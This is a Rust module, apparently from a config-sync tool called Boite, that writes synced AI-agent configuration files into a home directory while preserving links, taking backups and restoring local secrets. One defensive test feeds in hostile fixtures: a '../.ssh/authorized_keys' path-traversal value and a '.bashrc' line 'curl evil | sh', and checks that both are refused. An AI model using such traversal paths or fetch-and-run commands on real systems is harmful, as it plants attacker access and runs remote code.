//! Writing the repository's side onto this machine.
//!
//! One rule decides the shape of this file: **create atomically, update in
//! place.**
//!
//! `~/.agents/AGENTS.md` is one inode with four names — `~/.gemini/GEMINI.md`
//! and `~/.gemini/config/AGENTS.md` are two of them, measured, not supposed. The
//! tmp-file-then-rename idiom used elsewhere in this crate creates a *new*
//! inode, so applying a merge that way would silently un-share all four: the
//! file would still be there, still correct, and no longer the same file. The
//! user would find out weeks later when an edit stopped following.
//!
//! So a target that already exists is opened and truncated, which keeps the
//! inode and updates every name at once — which is what the user wanted in the
//! first place. Two things fall out for free: a config that is a symlink stays a
//! symlink, with no `canonicalize` and none of the bugs that come with it, and a
//! junction on Windows is written through rather than replaced.
//!
//! In place is not atomic. That is the trade, and it is the one place this
//! module can lose data: a crash or a full disk between the truncate and the
//! write leaves the file short. The mitigation is that a copy of the old bytes
//! is written *first*, and its directory is reported, so the sentence a user
//! reads on failure can name where their file went.
//!
//! Nothing here deletes. Not a file, not a directory, not a link, not a
//! component of a parent chain. `remove_dir_all` does not appear in this module
//! and must not.

use std::collections::BTreeMap;
use std::fs::{self, OpenOptions};
use std::io::Write;
use std::path::{Path, PathBuf};

use super::manifest;
use super::portable;

/// What a pull did, and everything it would not do.
#[derive(Debug, Default, Clone, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Outcome {
    /// Home-relative paths this machine now holds.
    pub written: Vec<String>,
    /// Placeholders with no local value to put back. The placeholder is left in
    /// the file, which stays valid, and names Boite and the field it came from.
    pub needed: Vec<portable::Applied>,
    pub refused: Vec<Refused>,
    /// Where the previous contents went, when anything was replaced.
    pub backup_dir: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Refused {
    pub path: String,
    pub reason: String,
}

/// Writes what the repository holds, for the sources that are switched on.
///
/// `backup_root` is where replaced contents are copied before anything is
/// truncated; it is created on first use and not before, so a pull that replaces
/// nothing leaves no directory behind.
pub fn apply(
    home: &Path,
    backup_root: &Path,
    enabled: &[&str],
    incoming: &BTreeMap<String, Vec<u8>>,
) -> Outcome {
    let mut outcome = Outcome::default();
    let Some(home_text) = home.to_str() else {
        outcome.refused.push(Refused {
            path: home.display().to_string(),
            reason: "the home directory path is not valid UTF-8".to_string(),
        });
        return outcome;
    };
    let stamp = crate::now_ms();
    let backup_dir = backup_root.join(stamp.to_string());
    for (repo_path, bytes) in incoming {
        // Every path here was written by another machine. Nothing about it is
        // trusted: an id nobody declares, a source no longer in the manifest, a
        // shape that is not home-relative and a denied name all stop here.
        let Some(named) = manifest::from_repo_path(repo_path) else {
            outcome.refused.push(Refused {
                path: repo_path.clone(),
                reason: "not something this version of Boite syncs".to_string(),
            });
            continue;
        };
        if !enabled.contains(&named.id) {
            continue;
        }
        match write_one(home, home_text, &backup_dir, &named, bytes, &mut outcome) {
            Ok(Wrote::Yes) => outcome.written.push(named.home_relative),
            Ok(Wrote::AlreadyMatched) => {}
            Err(reason) => outcome.refused.push(Refused { path: named.home_relative, reason }),
        }
    }
    if backup_dir.exists() {
        outcome.backup_dir = Some(backup_dir.display().to_string());
    }
    outcome
}

/// Whether anything on disk changed.
///
/// A file that already matches is not rewritten, so a pull that changes nothing
/// takes no backup, leaves every timestamp alone, and reports honestly that it
/// wrote nothing.
enum Wrote {
    Yes,
    AlreadyMatched,
}

fn write_one(
    home: &Path,
    home_text: &str,
    backup_dir: &Path,
    named: &manifest::Named,
    bytes: &[u8],
    outcome: &mut Outcome,
) -> Result<Wrote, String> {
    let Ok(incoming) = std::str::from_utf8(bytes) else {
        return Err("the repository holds bytes that are not text".to_string());
    };
    let target = home.join(as_native(&named.home_relative));

    // Parents first: reading a path whose ancestor is a file is ENOTDIR on
    // Unix and NotFound on Windows, and neither of those names the file in
    // the way. The walk below does.
    ensure_parents(home, &named.home_relative)?;

    // The local file is read for two reasons at once: to put back a secret this
    // machine already had, and to know whether there is anything to back up.
    let existing = read_existing(&target)?;

    // A placeholder is found by scanning, not by consulting the rule that made
    // it: the field it belongs to is written into the placeholder itself, so a
    // pull restores a value whose rule this build no longer declares.
    let restored = portable::inbound(incoming, existing.as_deref(), home_text);
    outcome.needed.extend(restored.needed);

    if existing.as_deref() == Some(restored.text.as_str()) {
        return Ok(Wrote::AlreadyMatched);
    }
    match existing {
        Some(previous) => {
            back_up(backup_dir, &named.home_relative, previous.as_bytes())?;
            update_in_place(&target, restored.text.as_bytes())?;
        }
        None => create_atomically(&target, restored.text.as_bytes())?,
    }
    Ok(Wrote::Yes)
}

/// The current contents, or `None` when there is nothing there.
///
/// A file that is not text is an error rather than a silent replacement: this
/// module writes text, and something else is living at that path.
fn read_existing(target: &Path) -> Result<Option<String>, String> {
    match fs::read(target) {
        Ok(raw) => match String::from_utf8(raw) {
            Ok(text) => Ok(Some(text)),
            Err(_) => Err("what is here is not text, and was left alone".to_string()),
        },
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(None),
        Err(error) => Err(format!("could not be read: {error}")),
    }
}

/// Keeps the inode, so every other name for this file follows.
///
/// Not atomic, deliberately. See the module header: the alternative severs a
/// hard link silently, and silence is worse than a failure that names a backup.
fn update_in_place(target: &Path, bytes: &[u8]) -> Result<(), String> {
    let mut file = OpenOptions::new()
        .write(true)
        .truncate(true)
        .open(target)
        .map_err(|error| format!("could not be opened for writing: {error}"))?;
    file.write_all(bytes).map_err(|error| format!("could not be written: {error}"))?;
    file.sync_all().map_err(|error| format!("could not be flushed: {error}"))
}

/// There is no link to sever, so this one is atomic.
fn create_atomically(target: &Path, bytes: &[u8]) -> Result<(), String> {
    let temporary = temporary_beside(target);
    {
        let mut file = fs::File::create(&temporary)
            .map_err(|error| format!("could not be created: {error}"))?;
        file.write_all(bytes).map_err(|error| format!("could not be written: {error}"))?;
        file.sync_all().map_err(|error| format!("could not be flushed: {error}"))?;
    }
    fs::rename(&temporary, target).map_err(|error| {
        let _ = fs::remove_file(&temporary);
        format!("could not be put in place: {error}")
    })
}

fn temporary_beside(target: &Path) -> PathBuf {
    let name = target.file_name().map(|name| name.to_string_lossy().to_string());
    let name = name.unwrap_or_else(|| "file".to_string());
    let parent = target.parent().map(Path::to_path_buf).unwrap_or_default();
    parent.join(format!(".{name}.boite-sync.tmp"))
}

/// A copy of what is about to be replaced, written before anything is truncated.
fn back_up(backup_dir: &Path, home_relative: &str, previous: &[u8]) -> Result<(), String> {
    let destination = backup_dir.join(as_native(home_relative));
    if let Some(parent) = destination.parent() {
        fs::create_dir_all(parent)
            .map_err(|error| format!("a backup directory could not be made: {error}"))?;
    }
    fs::write(&destination, previous)
        .map_err(|error| format!("a backup could not be written: {error}"))
}

/// Makes the directories a file needs, and replaces none of them.
///
/// A component that is a link is left exactly as it is and written *through*,
/// which is what stops `~/.claude/skills` from being turned from a link into a
/// real directory. A component that exists as a file is a refusal that names it,
/// because the alternative is deleting something nobody asked about.
fn ensure_parents(home: &Path, home_relative: &str) -> Result<(), String> {
    let segments: Vec<&str> = home_relative.split('/').collect();
    let mut walked = home.to_path_buf();
    for segment in &segments[..segments.len().saturating_sub(1)] {
        walked.push(segment);
        match fs::symlink_metadata(&walked) {
            Ok(meta) => {
                // The link question first: a Windows junction reports
                // is_dir() == false, and answering in the other order would read
                // this as a file and refuse a directory that is perfectly fine.
                if meta.file_type().is_symlink() {
                    continue;
                }
                if meta.is_file() {
                    return Err(format!(
                        "{} is a file, and a directory is needed there",
                        walked.display()
                    ));
                }
            }
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
                // create_dir_all on a path whose ancestor is a link writes into
                // the target, which is correct and is why the walk above never
                // needs to resolve one.
                return fs::create_dir_all(
                    home.join(as_native(home_relative)).parent().unwrap_or(home),
                )
                .map_err(|error| format!("a directory could not be made: {error}"));
            }
            Err(error) => return Err(format!("{} could not be read: {error}", walked.display())),
        }
    }
    Ok(())
}

/// A manifest path uses forward slashes; a Windows path joined from one keeps
/// them, and a mixed separator reaches tools that read `/` as something else.
fn as_native(home_relative: &str) -> PathBuf {
    let mut out = PathBuf::new();
    for segment in home_relative.split('/') {
        out.push(segment);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    struct TempHome(PathBuf);

    impl TempHome {
        fn new(label: &str) -> Self {
            let root = std::env::temp_dir()
                .join("boite-sync-apply")
                .join(format!("{label}-{}", std::process::id()));
            let _ = fs::remove_dir_all(&root);
            fs::create_dir_all(&root).expect("temp home");
            TempHome(root)
        }

        fn path(&self) -> &Path {
            &self.0
        }

        fn backups(&self) -> PathBuf {
            self.0.join(".boite/sync/backup")
        }

        fn write(&self, relative: &str, contents: &str) -> PathBuf {
            let full = self.0.join(as_native(relative));
            fs::create_dir_all(full.parent().expect("a parent")).expect("dirs");
            fs::write(&full, contents).expect("write");
            full
        }

        fn read(&self, relative: &str) -> String {
            fs::read_to_string(self.0.join(as_native(relative))).expect("read")
        }
    }

    impl Drop for TempHome {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.0);
        }
    }

    fn incoming(pairs: &[(&str, &str)]) -> BTreeMap<String, Vec<u8>> {
        pairs
            .iter()
            .map(|(path, body)| ((*path).to_string(), body.as_bytes().to_vec()))
            .collect()
    }

    /// The test this whole module exists for.
    ///
    /// `~/.agents/AGENTS.md`, `~/.gemini/GEMINI.md` and `~/.gemini/config/AGENTS.md`
    /// are one file with three names on a real machine. A write that replaced the
    /// inode would leave three correct files that no longer follow each other,
    /// and nothing would say so.
    #[test]
    fn a_hard_link_survives_a_write() {
        let home = TempHome::new("hard-link");
        let first = home.write(".agents/AGENTS.md", "# before\n");
        let second = home.path().join(".gemini").join("GEMINI.md");
        fs::create_dir_all(second.parent().expect("parent")).expect("dirs");
        assert!(
            fs::hard_link(&first, &second).is_ok(),
            "this filesystem cannot hold the arrangement the feature is built for"
        );

        let outcome = apply(
            home.path(),
            &home.backups(),
            &["agents"],
            &incoming(&[("agents/.agents/AGENTS.md", "# after\n")]),
        );
        assert_eq!(outcome.refused, vec![]);
        assert_eq!(outcome.written, vec![".agents/AGENTS.md".to_string()]);

        assert_eq!(home.read(".agents/AGENTS.md"), "# after\n");
        assert_eq!(
            fs::read_to_string(&second).expect("read"),
            "# after\n",
            "the other name did not follow: the write severed the link"
        );
        assert_eq!(
            fs::metadata(&first).expect("meta").len(),
            fs::metadata(&second).expect("meta").len()
        );
    }

    /// The old bytes are recoverable, which is what makes an in-place write an
    /// acceptable trade rather than a gamble.
    #[test]
    fn the_previous_contents_are_kept_before_anything_is_replaced() {
        let home = TempHome::new("backup");
        home.write(".agents/AGENTS.md", "# before\n");
        let outcome = apply(
            home.path(),
            &home.backups(),
            &["agents"],
            &incoming(&[("agents/.agents/AGENTS.md", "# after\n")]),
        );
        let backup_dir = outcome.backup_dir.expect("a backup directory");
        let kept = Path::new(&backup_dir).join(as_native(".agents/AGENTS.md"));
        assert_eq!(fs::read_to_string(kept).expect("read"), "# before\n");
    }

    /// Nothing was replaced, so no backup directory is left lying around.
    #[test]
    fn a_pull_that_creates_leaves_no_backup_behind() {
        let home = TempHome::new("create");
        let outcome = apply(
            home.path(),
            &home.backups(),
            &["agents"],
            &incoming(&[("agents/.agents/skills/one/SKILL.md", "# one\n")]),
        );
        assert_eq!(outcome.refused, vec![]);
        assert_eq!(home.read(".agents/skills/one/SKILL.md"), "# one\n");
        assert!(outcome.backup_dir.is_none());
        assert!(!home.backups().exists());
    }

    /// No temporary file is left where the real one goes.
    #[test]
    fn a_created_file_leaves_no_temporary_beside_it() {
        let home = TempHome::new("no-temp");
        apply(
            home.path(),
            &home.backups(),
            &["agents"],
            &incoming(&[("agents/.agents/AGENTS.md", "# one\n")]),
        );
        let leftovers: Vec<String> = fs::read_dir(home.path().join(".agents"))
            .expect("read dir")
            .flatten()
            .map(|item| item.file_name().to_string_lossy().to_string())
            .filter(|name| name.contains("boite-sync"))
            .collect();
        assert!(leftovers.is_empty(), "{leftovers:?}");
    }

    /// A switch that is off is a file this does not touch, whatever the
    /// repository holds for it.
    #[test]
    fn a_disabled_source_is_not_written() {
        let home = TempHome::new("disabled-write");
        let outcome = apply(
            home.path(),
            &home.backups(),
            &["agents"],
            &incoming(&[("claude/.claude/settings.json", r#"{"model":"opus"}"#)]),
        );
        assert!(outcome.written.is_empty());
        assert!(outcome.refused.is_empty(), "{:?}", outcome.refused);
        assert!(!home.path().join(".claude").exists());
    }

    /// Written by another machine, and it decides where bytes land here.
    #[test]
    fn a_path_this_build_does_not_declare_is_refused() {
        let home = TempHome::new("hostile");
        let outcome = apply(
            home.path(),
            &home.backups(),
            &["agents", "claude"],
            &incoming(&[
                ("claude/.claude.json", r#"{"machineID":"x"}"#),
                ("agents/.agents/../.ssh/authorized_keys", "ssh-rsa ..."),
                ("elsewhere/.bashrc", "curl evil | sh"),
            ]),
        );
        assert_eq!(outcome.refused.len(), 3, "{:?}", outcome.refused);
        assert!(outcome.written.is_empty());
        assert!(!home.path().join(".claude.json").exists());
        assert!(!home.path().join(".ssh").exists());
        assert!(!home.path().join(".bashrc").exists());
    }

    /// A pull restores the credential this machine already had, rather than
    /// writing the placeholder into the real file.
    #[test]
    fn a_secret_is_put_back_from_here() {
        let home = TempHome::new("secret");
        home.write(
            ".gemini/config/mcp_config.json",
            r#"{"mcpServers":{"github":{"headers":{"Authorization":"Bearer mine-1234"}}}}"#,
        );
        let outcome = apply(
            home.path(),
            &home.backups(),
            &["antigravity"],
            &incoming(&[(
                "antigravity/.gemini/config/mcp_config.json",
                r#"{"mcpServers":{"github":{"headers":{"Authorization":"__BOITE_SECRET:/mcpServers/github/headers/Authorization__"}},"extra":1}}"#,
            )]),
        );
        assert_eq!(outcome.refused, vec![]);
        let written = home.read(".gemini/config/mcp_config.json");
        assert!(written.contains("Bearer mine-1234"), "{written}");
        assert!(!written.contains("__BOITE_SECRET"), "{written}");
        assert!(written.contains("\"extra\":1"), "the rest of the file did not arrive");
        assert!(outcome.needed.is_empty());
    }

    /// A fresh machine has nothing to put back. The file still arrives, still
    /// parses, and the panel is told which field is missing.
    #[test]
    fn a_missing_secret_is_reported_and_the_file_still_arrives() {
        let home = TempHome::new("secret-missing");
        let outcome = apply(
            home.path(),
            &home.backups(),
            &["antigravity"],
            &incoming(&[(
                "antigravity/.gemini/config/mcp_config.json",
                r#"{"mcpServers":{"github":{"headers":{"Authorization":"__BOITE_SECRET:/mcpServers/github/headers/Authorization__"}}}}"#,
            )]),
        );
        assert_eq!(outcome.refused, vec![]);
        assert_eq!(outcome.needed.len(), 1);
        let written = home.read(".gemini/config/mcp_config.json");
        assert!(serde_json::from_str::<serde_json::Value>(&written).is_ok(), "{written}");
    }

    /// Identical is not written at all, so a pull that changes nothing takes no
    /// backup and leaves every timestamp alone.
    #[test]
    fn a_file_that_already_matches_is_left_untouched() {
        let home = TempHome::new("identical");
        home.write(".agents/AGENTS.md", "# same\n");
        let outcome = apply(
            home.path(),
            &home.backups(),
            &["agents"],
            &incoming(&[("agents/.agents/AGENTS.md", "# same\n")]),
        );
        assert!(outcome.written.is_empty());
        assert!(outcome.backup_dir.is_none());
    }

    /// Deleting it would be deleting something nobody asked about.
    #[test]
    fn a_parent_that_is_a_file_is_refused_and_left_alone() {
        let home = TempHome::new("parent-file");
        home.write(".agents/skills", "this is a file where a directory should be\n");
        let outcome = apply(
            home.path(),
            &home.backups(),
            &["agents"],
            &incoming(&[("agents/.agents/skills/one/SKILL.md", "# one\n")]),
        );
        assert_eq!(outcome.refused.len(), 1, "{:?}", outcome.refused);
        assert!(outcome.refused[0].reason.contains("is a file"), "{:?}", outcome.refused);
        assert_eq!(
            home.read(".agents/skills"),
            "this is a file where a directory should be\n",
            "the file in the way was touched"
        );
    }

    /// A config reached through a link stays reached through it. Replacing the
    /// link with a real file is how a dotfiles setup stops working.
    #[cfg(unix)]
    #[test]
    fn a_symlinked_config_stays_a_symlink() {
        let home = TempHome::new("symlinked");
        let real = home.write("dotfiles/AGENTS.md", "# before\n");
        let link = home.path().join(".agents").join("AGENTS.md");
        fs::create_dir_all(link.parent().expect("parent")).expect("dirs");
        std::os::unix::fs::symlink(&real, &link).expect("symlink");

        apply(
            home.path(),
            &home.backups(),
            &["agents"],
            &incoming(&[("agents/.agents/AGENTS.md", "# after\n")]),
        );
        assert!(fs::symlink_metadata(&link).expect("meta").file_type().is_symlink());
        assert_eq!(fs::read_to_string(&real).expect("read"), "# after\n");
    }

    #[cfg(unix)]
    fn link_dir(target: &Path, link: &Path) -> bool {
        std::os::unix::fs::symlink(target, link).is_ok()
    }

    /// A junction rather than a symlink, for the reason the artifacts module
    /// gives: symlink creation on Windows needs developer mode or elevation, and
    /// a junction needs neither. This is the arrangement `~/.claude/skills`
    /// actually has on the machine this feature was measured on.
    #[cfg(windows)]
    fn link_dir(target: &Path, link: &Path) -> bool {
        use std::os::windows::process::CommandExt;
        match std::process::Command::new("cmd")
            .args(["/c", "mklink", "/J"])
            .arg(link)
            .arg(target)
            .creation_flags(0x0800_0000)
            .output()
        {
            Ok(out) if out.status.success() => true,
            Ok(out) => {
                eprintln!("mklink refused: {}", String::from_utf8_lossy(&out.stderr));
                false
            }
            Err(error) => {
                eprintln!("mklink did not start: {error}");
                false
            }
        }
    }

    /// The measured layout: `~/.claude/skills` is a link into `~/.agents`. A pull
    /// that wrote through it must not turn it into a real directory.
    ///
    /// Cross-platform on purpose. The home this was designed against is Windows,
    /// where the link is a junction and where `is_dir()` on one answers false —
    /// which is exactly the case a unix-only test would never have caught.
    #[test]
    fn a_link_in_the_parent_chain_is_written_through_not_replaced() {
        let home = TempHome::new("parent-link");
        fs::create_dir_all(home.path().join("shared").join("one")).expect("dirs");
        let link = home.path().join(".agents").join("skills");
        fs::create_dir_all(link.parent().expect("parent")).expect("dirs");
        assert!(
            link_dir(&home.path().join("shared"), &link),
            "this machine cannot make a directory link, which the feature depends on"
        );

        let outcome = apply(
            home.path(),
            &home.backups(),
            &["agents"],
            &incoming(&[("agents/.agents/skills/one/SKILL.md", "# one\n")]),
        );
        assert_eq!(outcome.refused, vec![]);
        assert!(
            fs::symlink_metadata(&link).expect("meta").file_type().is_symlink(),
            "the link was replaced by a real directory"
        );
        assert_eq!(
            fs::read_to_string(home.path().join("shared/one/SKILL.md")).expect("read"),
            "# one\n",
            "the write did not go through the link"
        );
    }
}
